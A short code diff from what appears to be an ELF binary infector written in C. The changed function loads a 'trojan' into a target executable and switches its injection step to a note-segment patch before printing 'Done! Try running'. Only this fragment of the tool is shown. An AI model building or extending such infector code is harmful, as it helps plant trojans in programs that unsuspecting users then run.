@@ -83,16 +83,9 @@ static bool doit(const char *binfile, const char *trojan) {
         long magic = (long)0x1122334455667788;
 
         infect_t *inf = inf_load(elfo, trojanfp, m1, magic, &src_map);
-        if (inf_scan_segment(inf)) {
-            if ((rc = inf_load_and_patch(inf)) == true) {
-                // Make sure it is written
-                (void)file_sync_target(&map);
 
-                printf("Done!\nTry running %s\n", file);
-            }
-            else
-                printf("Failed :(\n");
-        }
+        if (inf_note_patch(inf))
+            printf("Done!\nTry running %s\n", file);
 
         free(inf->trojan);
         free(inf);
